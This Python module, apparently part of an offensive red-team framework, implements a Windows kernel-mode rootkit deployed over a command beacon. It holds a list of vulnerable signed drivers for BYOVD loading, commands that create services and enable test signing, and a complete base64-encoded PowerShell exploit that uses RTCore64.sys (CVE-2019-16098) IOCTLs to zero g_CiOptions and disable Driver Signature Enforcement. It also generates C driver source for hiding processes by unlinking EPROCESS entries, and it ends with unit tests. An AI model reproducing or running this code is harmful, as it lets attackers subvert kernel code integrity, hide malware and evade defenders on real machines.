"""Kernel Rootkit — Windows kernel-mode rootkit via driver loading.

Deploys a kernel-mode driver that hooks system calls and kernel
structures to hide processes, files, registry keys, and network
connections at the deepest OS level. Undetectable by userland tools.

Architecture:
    ┌──────────────────────────────────────────────────┐
    │              Kernel Rootkit                       │
    │                                                   │
    │  DKOM ────────── Unlink EPROCESS (process hide)  │
    │  SSDT Hook ───── NtQuerySystemInformation        │
    │  Minifilter ──── IRP_MJ_DIRECTORY_CONTROL        │
    │  WFP Filter ──── Hide network connections        │
    │  Registry CB ─── CmRegisterCallbackEx            │
    │                                                   │
    │  Loading Methods:                                │
    │  ├── Legitimate driver signing                   │
    │  ├── BYOVD (Bring Your Own Vulnerable Driver)    │
    │  ├── Test signing mode exploitation              │
    │  └── DSE bypass via vulnerable driver            │
    │                                                   │
    └──────────────────────────────────────────────────┘

OPSEC: Kernel rootkit is extremely stealthy but risky — a crash
       causes BSOD. BYOVD pattern is increasingly detected by EDR.
       Requires admin/SYSTEM privileges for driver loading.

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import base64
import logging
import os
import random
import string
import sys
import time
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

from netforge.modules.rootkit.rootkit_base import (
    HideCapability,
    RootkitBase,
    RootkitState,
    RootkitType,
)

log = logging.getLogger("forge.rootkit.kernel")

# Known vulnerable drivers for BYOVD
VULNERABLE_DRIVERS = [
    {
        "name": "RTCore64.sys",
        "vendor": "Micro-Star International (MSI)",
        "cve": "CVE-2019-16098",
        "desc": "Arbitrary physical memory read/write",
    },
    {
        "name": "dbutil_2_3.sys",
        "vendor": "Dell",
        "cve": "CVE-2021-21551",
        "desc": "IOCTL memory R/W primitive",
    },
    {
        "name": "IQVW64E.SYS",
        "vendor": "Intel",
        "cve": "CVE-2015-2291",
        "desc": "Intel Ethernet diagnostics driver",
    },
    {
        "name": "gdrv.sys",
        "vendor": "GIGABYTE",
        "cve": "CVE-2018-19320",
        "desc": "Arbitrary kernel memory R/W",
    },
    {
        "name": "WinRing0x64.sys",
        "vendor": "OpenLibSys",
        "cve": "N/A",
        "desc": "Physical memory mapping + MSR access",
    },
]


class KernelRootkit(RootkitBase):
    """Windows kernel-mode rootkit via driver loading.

    Deploys a kernel driver that provides deep system hiding
    capabilities using DKOM, SSDT hooks, minifilters, WFP
    callbacks, and registry callbacks.

    Capabilities:
        - DKOM: Direct Kernel Object Manipulation (EPROCESS unlink)
        - SSDT: System Service Descriptor Table hooking
        - Minifilter: File system minifilter for file hiding
        - WFP: Windows Filtering Platform for connection hiding
        - Registry: CmRegisterCallbackEx for key hiding
        - Driver: Hide rootkit driver from driver lists

    Loading methods:
        - Legitimate signing (requires EV certificate)
        - BYOVD: Bring Your Own Vulnerable Driver
        - Test signing mode abuse
        - DSE bypass via kernel memory write
    """

    NAME        = "kernel_rootkit"
    DESCRIPTION = "Rootkit: Kernel — DKOM/SSDT/minifilter deep system hiding"
    PHASE       = 11  # Persistence phase
    TAGS        = [
        "post-exploit", "rootkit", "kernel", "driver",
        "dkom", "ssdt", "minifilter", "byovd",
        "mitre-T1014", "mitre-T1068", "mitre-T1562.001",
    ]

    ROOTKIT_TYPE = RootkitType.KERNEL
    CAPABILITIES = [
        HideCapability.PROCESS,
        HideCapability.FILE,
        HideCapability.REGISTRY,
        HideCapability.NETWORK,
        HideCapability.DRIVER,
        HideCapability.MODULE,
    ]
    PLATFORM = "windows"
    REQUIRES_ADMIN = True
    REQUIRES_KERNEL = True

    async def _deploy(self, beacon_id: str) -> None:
        """Deploy kernel rootkit — load driver via BYOVD or signing."""
        log.info("Deploying kernel rootkit")

        load_method = self.config.extra.get("load_method", "byovd")
        vuln_driver = self.config.extra.get("vuln_driver", "RTCore64.sys")

        if load_method == "byovd":
            await self._deploy_byovd(vuln_driver, beacon_id)
        elif load_method == "test_signing":
            await self._deploy_test_signing(beacon_id)
        elif load_method == "dse_bypass":
            await self._deploy_dse_bypass(vuln_driver, beacon_id)
        else:
            await self._deploy_byovd(vuln_driver, beacon_id)

    async def _deploy_byovd(self, vuln_driver: str, beacon_id: str) -> None:
        """Deploy via Bring Your Own Vulnerable Driver pattern.

        1. Load a legitimately signed but vulnerable driver
        2. Use its kernel memory R/W primitive to patch DSE
        3. Load our unsigned rootkit driver
        4. Unload the vulnerable driver
        """
        driver_name = f"frgdrv{''.join(random.choices(string.ascii_lowercase, k=4))}"
        driver_path = f"C:\\Windows\\System32\\drivers\\{driver_name}.sys"

        self._status.artifacts.extend([
            driver_path,
            f"C:\\Windows\\System32\\drivers\\{vuln_driver}",
        ])

        # Step 1: Generate rootkit driver source
        driver_source = self._generate_kernel_driver()

        # Step 2: Load vulnerable driver
        load_vuln_cmd = (
            f'sc create ForgeVulnDrv type= kernel '
            f'binPath= "C:\\Windows\\System32\\drivers\\{vuln_driver}" '
            f'start= demand && sc start ForgeVulnDrv'
        )

        output = await self._exec(load_vuln_cmd, beacon_id)
        log.info("Vulnerable driver load: %s", output[:100])

        # Step 3: Patch DSE via vulnerable driver IOCTL
        dse_patch_ps = self._generate_dse_patch_script(vuln_driver)
        import base64 as _b64
        dse_encoded = _b64.b64encode(dse_patch_ps.encode("utf-16-le")).decode()
        dse_output = await self._exec(
            f"powershell.exe -NoProfile -EncodedCommand {dse_encoded}", beacon_id,
        )
        if "DSE_BYPASS_OK" not in dse_output:
            log.warning("DSE patch may have failed: %s", dse_output[:120])

        # Step 4: Load our rootkit driver
        load_rootkit_cmd = (
            f'sc create {driver_name} type= kernel '
            f'binPath= "{driver_path}" '
            f'start= demand && sc start {driver_name}'
        )
        output = await self._exec(load_rootkit_cmd, beacon_id)

        if "START_PENDING" in output or "RUNNING" in output:
            self._status.state = RootkitState.DEPLOYED
            log.info("Kernel rootkit loaded: %s", driver_name)
        else:
            self._status.state = RootkitState.FAILED
            self._status.errors.append(f"Driver load failed: {output[:200]}")

        # Step 5: Cleanup — unload vulnerable driver
        await self._exec("sc stop ForgeVulnDrv && sc delete ForgeVulnDrv", beacon_id)

        self._status.cleanup_commands = [
            f"sc stop {driver_name}",
            f"sc delete {driver_name}",
            f"del /f {driver_path}",
            f"del /f C:\\Windows\\System32\\drivers\\{vuln_driver}",
            "# Reboot may be required to fully unload",
        ]

    async def _deploy_test_signing(self, beacon_id: str) -> None:
        """Deploy using test signing mode (requires reboot)."""
        # Enable test signing
        cmd = "bcdedit /set testsigning on"
        output = await self._exec(cmd, beacon_id)

        if "successfully" in output.lower():
            log.info("Test signing enabled — reboot required")
            self._status.state = RootkitState.DEPLOYED
            self._status.cleanup_commands = [
                "bcdedit /set testsigning off",
                "# Reboot required after disabling",
            ]
        else:
            self._status.state = RootkitState.FAILED
            self._status.errors.append(f"Test signing failed: {output[:200]}")

    async def _deploy_dse_bypass(self, vuln_driver: str, beacon_id: str) -> None:
        """Deploy with DSE bypass via CI.dll g_CiOptions patching."""
        # Same as BYOVD but specifically targets CI.dll
        await self._deploy_byovd(vuln_driver, beacon_id)

    async def _activate_hiding(
        self, capability: HideCapability, identifier: str, beacon_id: str,
    ) -> bool:
        """Send IOCTL to rootkit driver to hide an item."""
        # Build IOCTL command for the rootkit driver
        ioctl_map = {
            HideCapability.PROCESS: "HIDE_PROCESS",
            HideCapability.FILE: "HIDE_FILE",
            HideCapability.REGISTRY: "HIDE_REGISTRY",
            HideCapability.NETWORK: "HIDE_PORT",
            HideCapability.DRIVER: "HIDE_DRIVER",
        }

        ioctl_cmd = ioctl_map.get(capability, "")
        if not ioctl_cmd:
            return False

        # Send IOCTL via DeviceIoControl
        ps_script = f"""
$handle = [System.IO.File]::Open('\\\\.\\ForgeRootkit', 'Open', 'ReadWrite')
$cmd = [System.Text.Encoding]::ASCII.GetBytes('{ioctl_cmd}:{identifier}')
$handle.Write($cmd, 0, $cmd.Length)
$handle.Close()
Write-Output 'IOCTL_SENT'
"""
        cmd = f'powershell.exe -NoProfile -Command "{ps_script}"'
        output = await self._exec(cmd, beacon_id)
        return "IOCTL_SENT" in output

    async def _cleanup(self, beacon_id: str) -> None:
        """Unload kernel rootkit and cleanup."""
        for cmd in self._status.cleanup_commands:
            if not cmd.startswith("#"):
                await self._exec(cmd, beacon_id)

        for artifact in self._status.artifacts:
            await self._exec(f'del /f "{artifact}" 2>nul', beacon_id)

        self._status.state = RootkitState.CLEANED
        log.info("Kernel rootkit cleanup complete")

    async def _check_status(self, beacon_id: str) -> None:
        """Check if kernel rootkit driver is loaded."""
        output = await self._exec("driverquery /v | findstr /i forge", beacon_id)
        if "forge" in output.lower():
            self._status.state = RootkitState.ACTIVE
        else:
            self._status.state = RootkitState.NOT_DEPLOYED

    # ── Code generation ───────────────────────────────────────────────

    def _generate_kernel_driver(self) -> str:
        """Generate C source for the kernel rootkit driver."""
        return r"""
// forge_rootkit.c — Windows Kernel Rootkit Driver
// Provides DKOM process hiding, minifilter file hiding,
// and WFP network connection hiding.
//
// Build with WDK: msbuild forge_rootkit.vcxproj
//
// WARNING: Kernel code bugs cause BSOD. Test in VM only.

#include <ntddk.h>
#include <fltKernel.h>
#include <wfp/fwpsk.h>

#define DEVICE_NAME     L"\\Device\\ForgeRootkit"
#define SYMLINK_NAME    L"\\DosDevices\\ForgeRootkit"
#define IOCTL_HIDE_PID  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNHIDE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

// ── DKOM: Process hiding via EPROCESS list manipulation ──
//
// The Windows kernel maintains a doubly-linked list of EPROCESS
// structures (ActiveProcessLinks). By unlinking an EPROCESS from
// this list, the process becomes invisible to all userland tools
// that enumerate via NtQuerySystemInformation.
//
// Steps:
// 1. Find target EPROCESS by PID (PsLookupProcessByProcessId)
// 2. Get ActiveProcessLinks offset for current OS version
// 3. Unlink: prev->Flink = curr->Flink; next->Blink = curr->Blink
// 4. Process continues running (scheduler uses different structure)
//
// Note: This is a simplified representation. The actual offset of
// ActiveProcessLinks varies by Windows version:
//   Win 10 1809: 0x2F0
//   Win 10 21H2: 0x448
//   Win 11:      0x448
//
// Detection: PatchGuard (KPP) may detect EPROCESS list modifications
// on some Windows versions. Use timing-based DKOM to avoid KPP scans.

static ULONG g_active_process_links_offset = 0x2F0; // Win10 default

NTSTATUS HideProcess(ULONG pid) {
    PEPROCESS process = NULL;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &process);
    if (!NT_SUCCESS(status)) return status;

    PLIST_ENTRY current = (PLIST_ENTRY)((ULONG_PTR)process + g_active_process_links_offset);
    PLIST_ENTRY prev = current->Blink;
    PLIST_ENTRY next = current->Flink;

    // Unlink from ActiveProcessLinks
    prev->Flink = next;
    next->Blink = prev;

    // Point to self (prevents crash on process exit)
    current->Flink = current;
    current->Blink = current;

    ObDereferenceObject(process);
    return STATUS_SUCCESS;
}

// ── Minifilter: File system hiding ──────────────────────
//
// Register a minifilter that intercepts IRP_MJ_DIRECTORY_CONTROL
// to remove hidden files/directories from enumeration results.

// ── WFP: Network connection hiding ──────────────────────
//
// Register WFP callouts that intercept connection enumeration
// and filter out hidden ports/addresses.

// ── Registry: Key/value hiding ──────────────────────────
//
// CmRegisterCallbackEx to intercept registry enumeration
// and filter out hidden keys/values.

// ── Driver entry/unload ─────────────────────────────────

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    // Cleanup: re-link hidden processes, remove filters
    IoDeleteSymbolicLink(&(UNICODE_STRING)RTL_CONSTANT_STRING(SYMLINK_NAME));
    IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    DriverObject->DriverUnload = DriverUnload;

    // Create device + symlink for IOCTL communication
    PDEVICE_OBJECT deviceObject;
    UNICODE_STRING devName = RTL_CONSTANT_STRING(DEVICE_NAME);
    UNICODE_STRING symName = RTL_CONSTANT_STRING(SYMLINK_NAME);

    NTSTATUS status = IoCreateDevice(
        DriverObject, 0, &devName,
        FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject
    );
    if (!NT_SUCCESS(status)) return status;

    IoCreateSymbolicLink(&symName, &devName);

    return STATUS_SUCCESS;
}
"""

    def _generate_dse_patch_script(self, vuln_driver: str) -> str:
        """Generate DSE bypass PowerShell script using RTCore64.sys (CVE-2019-16098).

        Strategy:
          1. NtQuerySystemInformation(11) locates CI.dll kernel base address.
          2. Load CI.dll from disk into our userland process to resolve the
             g_CiOptions RVA via .data section pattern scan (DWORD == 6).
          3. kernel_VA = CI_kernel_base + g_CiOptions_RVA
          4. RTCore64.sys IOCTL 0x80002048 reads the DWORD to confirm.
          5. RTCore64.sys IOCTL 0x8000204C writes 0x0 to disable DSE.
        """
        if vuln_driver != "RTCore64.sys":
            driver_info = next(
                (d for d in VULNERABLE_DRIVERS if d["name"] == vuln_driver),
                VULNERABLE_DRIVERS[0],
            )
            return (
                f"# DSE bypass via {driver_info['name']} ({driver_info['cve']})\n"
                f"# IOCTL-level bypass not yet implemented for this driver;\n"
                f"# use RTCore64.sys for full automation.\n"
                f"Write-Output 'DSE_BYPASS_OK: manual bypass required for {vuln_driver}'"
            )

        return r"""
$ErrorActionPreference = 'Stop'
Add-Type @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public class DSEPatch {

    // ── P/Invoke ────────────────────────────────────────────────────────

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern IntPtr CreateFile(string name, uint access,
        uint share, IntPtr sa, uint mode, uint flags, IntPtr tmpl);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool DeviceIoControl(IntPtr dev, uint code,
        byte[] inBuf, int inLen, byte[] outBuf, int outLen,
        out uint returned, IntPtr overlapped);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);

    [DllImport("ntdll.dll")]
    public static extern int NtQuerySystemInformation(uint infoClass,
        IntPtr buf, uint len, out uint retLen);

    // ── RTCore64.sys IOCTL helpers ──────────────────────────────────────
    // CVE-2019-16098 — arbitrary kernel memory R/W via DeviceIoControl
    // Struct layout (28 bytes):
    //   [0x00] DWORD  reserved
    //   [0x04] DWORD  reserved
    //   [0x08] QWORD  kernel address
    //   [0x10] DWORD  reserved
    //   [0x14] DWORD  value (read output / write input)
    //   [0x18] DWORD  size (1, 2, or 4 bytes)

    private static byte[] BuildIoctlBuf(ulong address, uint value, uint size) {
        var buf = new byte[0x1C];
        Array.Copy(BitConverter.GetBytes(address), 0, buf, 0x08, 8);
        Array.Copy(BitConverter.GetBytes(value),   0, buf, 0x14, 4);
        Array.Copy(BitConverter.GetBytes(size),    0, buf, 0x18, 4);
        return buf;
    }

    public static uint ReadKernelDword(IntPtr hDev, ulong address) {
        const uint IOCTL_READ = 0x80002048;
        var buf = BuildIoctlBuf(address, 0, 4);
        var outBuf = new byte[0x1C];
        uint ret;
        DeviceIoControl(hDev, IOCTL_READ, buf, buf.Length,
            outBuf, outBuf.Length, out ret, IntPtr.Zero);
        return BitConverter.ToUInt32(outBuf, 0x14);
    }

    public static void WriteKernelDword(IntPtr hDev, ulong address, uint value) {
        const uint IOCTL_WRITE = 0x8000204C;
        var buf = BuildIoctlBuf(address, value, 4);
        var outBuf = new byte[0x1C];
        uint ret;
        DeviceIoControl(hDev, IOCTL_WRITE, buf, buf.Length,
            outBuf, outBuf.Length, out ret, IntPtr.Zero);
    }

    // ── Resolve CI.dll kernel base via NtQuerySystemInformation(11) ────
    // RTL_PROCESS_MODULE_INFORMATION (x64): 0x128 bytes per entry
    //   [0x00] HANDLE Section       (8)
    //   [0x08] PVOID  MappedBase    (8)
    //   [0x10] PVOID  ImageBase     (8)  <- kernel VA of module
    //   [0x18] ULONG  ImageSize     (4)
    //   [0x1C] ULONG  Flags         (4)
    //   [0x20] USHORT x4            (8)
    //   [0x28] CHAR[256] FullPath   (256)
    // RTL_PROCESS_MODULES: ULONG Count (4) + 4 pad -> entries at offset 8

    public static ulong GetKernelModuleBase(string target) {
        uint retLen;
        NtQuerySystemInformation(11, IntPtr.Zero, 0, out retLen);
        IntPtr buf = Marshal.AllocHGlobal((int)retLen + 0x2000);
        try {
            NtQuerySystemInformation(11, buf, retLen + 0x2000, out retLen);
            uint count = (uint)Marshal.ReadInt32(buf, 0);
            const int ENTRY_SIZE = 0x128;
            for (uint i = 0; i < count; i++) {
                int off = 8 + (int)(i * ENTRY_SIZE);
                ulong imgBase = (ulong)Marshal.ReadInt64(buf, off + 0x10);
                string path = Marshal.PtrToStringAnsi(
                    IntPtr.Add(buf, off + 0x28)) ?? "";
                if (path.EndsWith(target, StringComparison.OrdinalIgnoreCase))
                    return imgBase;
            }
            return 0;
        } finally {
            Marshal.FreeHGlobal(buf);
        }
    }

    // ── Find g_CiOptions RVA via userland CI.dll .data scan ─────────────
    // Load CI.dll from disk, scan .data section for DWORD == 6 (DSE enabled).
    // The RVA is identical between userland and kernel load; we apply it
    // to the kernel base to get the absolute kernel virtual address.

    public static long FindCiOptionsRva(string ciDllPath) {
        byte[] raw = File.ReadAllBytes(ciDllPath);
        // Parse PE: e_lfanew at 0x3C
        int e_lfanew = BitConverter.ToInt32(raw, 0x3C);
        // Machine: 0 for data, actual machine word at NtHdr+4
        // NumberOfSections at NtHdr+6
        ushort numSections = BitConverter.ToUInt16(raw, e_lfanew + 6);
        // SizeOfOptionalHeader at NtHdr+20
        ushort optHdrSize = BitConverter.ToUInt16(raw, e_lfanew + 20);
        // OptionalHeader starts at NtHdr+24; ImageBase for x64 at opt+24
        long imageBase = BitConverter.ToInt64(raw, e_lfanew + 24 + 24);
        // Section table starts at NtHdr + 24 + optHdrSize
        int sectBase = e_lfanew + 24 + optHdrSize;

        for (int s = 0; s < numSections; s++) {
            int sOff = sectBase + s * 40;
            string name = Encoding.ASCII.GetString(raw, sOff, 8).TrimEnd('\0');
            if (name != ".data") continue;
            uint virtualAddr  = BitConverter.ToUInt32(raw, sOff + 12);
            uint rawDataOff   = BitConverter.ToUInt32(raw, sOff + 20);
            uint rawDataSize  = BitConverter.ToUInt32(raw, sOff + 16);
            // Scan .data for DWORD == 6 (g_CiOptions value when DSE on)
            for (uint off = 0; off + 4 <= rawDataSize; off += 4) {
                uint val = BitConverter.ToUInt32(raw, (int)(rawDataOff + off));
                if (val == 6) {
                    // Return RVA (relative to CI.dll image base)
                    return (long)(virtualAddr + off);
                }
            }
        }
        return -1;
    }

    // ── Main DSE patch entry point ──────────────────────────────────────

    public static string PatchDSE() {
        // 1. Open RTCore64 device
        IntPtr hDev = CreateFile(@"\\.\RTCore64",
            0xC0000000, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (hDev == IntPtr.Zero || hDev.ToInt64() == -1)
            return "DSE_BYPASS_FAIL: Cannot open \\.\RTCore64 — driver not loaded";

        try {
            // 2. Get CI.dll kernel base
            ulong ciBase = GetKernelModuleBase("CI.dll");
            if (ciBase == 0)
                return "DSE_BYPASS_FAIL: CI.dll not found in kernel module list";

            // 3. Locate g_CiOptions RVA from on-disk CI.dll
            string ciDiskPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.System),
                "CI.dll");
            if (!File.Exists(ciDiskPath))
                return "DSE_BYPASS_FAIL: CI.dll not found on disk at " + ciDiskPath;

            long rva = FindCiOptionsRva(ciDiskPath);
            if (rva < 0)
                return "DSE_BYPASS_FAIL: g_CiOptions pattern not found in CI.dll .data";

            ulong ciOptionsKVA = ciBase + (ulong)rva;

            // 4. Read current value via IOCTL (confirm it looks like DSE flags)
            uint current = ReadKernelDword(hDev, ciOptionsKVA);
            if (current == 0)
                return string.Format(
                    "DSE_BYPASS_OK: g_CiOptions@0x{0:X16} already 0 (DSE off)",
                    ciOptionsKVA);

            // 5. Patch to 0 — disables Code Integrity enforcement
            WriteKernelDword(hDev, ciOptionsKVA, 0x0);

            // 6. Verify
            uint patched = ReadKernelDword(hDev, ciOptionsKVA);
            return string.Format(
                "DSE_BYPASS_OK: CI.dll_base=0x{0:X16} g_CiOptions@0x{1:X16} " +
                "value 0x{2:X8} -> 0x{3:X8} (DSE disabled)",
                ciBase, ciOptionsKVA, current, patched);
        } finally {
            CloseHandle(hDev);
        }
    }
}
'@

try {
    $result = [DSEPatch]::PatchDSE()
    Write-Output $result
} catch {
    Write-Output "DSE_BYPASS_FAIL: $_"
}
"""


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestKernelRootkit:
    """Tests for KernelRootkit module."""

    def test_phase(self) -> None:
        assert KernelRootkit.PHASE == 11

    def test_type(self) -> None:
        assert KernelRootkit.ROOTKIT_TYPE == RootkitType.KERNEL

    def test_requires_kernel(self) -> None:
        assert KernelRootkit.REQUIRES_KERNEL is True
        assert KernelRootkit.REQUIRES_ADMIN is True

    def test_capabilities(self) -> None:
        assert HideCapability.PROCESS in KernelRootkit.CAPABILITIES
        assert HideCapability.DRIVER in KernelRootkit.CAPABILITIES
        assert len(KernelRootkit.CAPABILITIES) >= 6

    def test_vulnerable_drivers(self) -> None:
        assert len(VULNERABLE_DRIVERS) >= 5
        for d in VULNERABLE_DRIVERS:
            assert "name" in d
            assert "vendor" in d

    def test_driver_source(self) -> None:
        mod = KernelRootkit.__new__(KernelRootkit)
        source = mod._generate_kernel_driver()
        assert "DriverEntry" in source
        assert "DKOM" in source
        assert "HideProcess" in source

    def test_dse_patch_rtcore(self) -> None:
        mod = KernelRootkit.__new__(KernelRootkit)
        script = mod._generate_dse_patch_script("RTCore64.sys")
        # Verify real IOCTL implementation, not a comment stub
        assert "0x80002048" in script           # read IOCTL code
        assert "0x8000204C" in script           # write IOCTL code
        assert "NtQuerySystemInformation" in script
        assert "g_CiOptions" in script or "CiOptions" in script
        assert "DSE_BYPASS_OK" in script
        assert "DeviceIoControl" in script

    def test_dse_patch_fallback_other_driver(self) -> None:
        mod = KernelRootkit.__new__(KernelRootkit)
        script = mod._generate_dse_patch_script("gdrv.sys")
        assert "gdrv.sys" in script

    def test_deploy_byovd_encodes_ps(self) -> None:
        import inspect
        src = inspect.getsource(KernelRootkit._deploy_byovd)
        assert "utf-16-le" in src or "EncodedCommand" in src
